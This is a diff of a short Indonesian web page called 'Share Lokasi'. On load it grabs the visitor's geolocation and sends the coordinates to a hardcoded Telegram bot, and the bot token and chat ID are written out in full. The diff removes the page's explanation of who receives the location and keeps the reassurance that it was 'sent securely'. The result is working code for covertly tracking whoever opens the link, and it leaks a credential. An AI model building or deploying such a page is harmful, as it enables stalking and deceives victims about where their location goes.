@@ -1,41 +1,47 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Share Lokasi Aman</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Lokasi</title>
 </head>
 <body>
-  <h2>Bagikan Lokasi Kamu</h2>
-  <p>Mohon izinkan akses lokasi agar bisa langsung dikirim ke petugas.</p>
+  <h2>Meminta Lokasi...</h2>
+  <p id="status">Mengambil lokasi...</p>
 
   <script>
-    const telegramBotToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-    const telegramChatId = "5677912817";
+    function sendLocation(lat, lon) {
+      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+      const chatId = "5677912817";
+      const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
 
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-        const message = `Lokasi terkini dari teman:
-${mapsLink}`;
-
-        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: telegramChatId,
-            text: message
-          })
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            document.getElementById("status").innerText = "Lokasi kamu berhasil dikirim dengan aman.";
+          } else {
+            document.getElementById("status").innerText = "Gagal mengirim lokasi.";
+          }
+        })
+        .catch(err => {
+          document.getElementById("status").innerText = "Terjadi kesalahan: " + err;
         });
+    }
 
-        document.body.innerHTML = "<p>Lokasi kamu berhasil dikirim dengan aman.</p>";
-      },
-      function(error) {
-        document.body.innerHTML = "<p>Gagal mendapatkan lokasi. Mohon izinkan akses lokasi di browser kamu.</p>";
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            sendLocation(position.coords.latitude, position.coords.longitude);
+          },
+          () => {
+            document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Mohon izinkan akses lokasi di browser kamu.";
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "Geolocation tidak didukung oleh browser ini.";
       }
-    );
+    }
+
+    getLocation();
   </script>
 </body>
 </html>
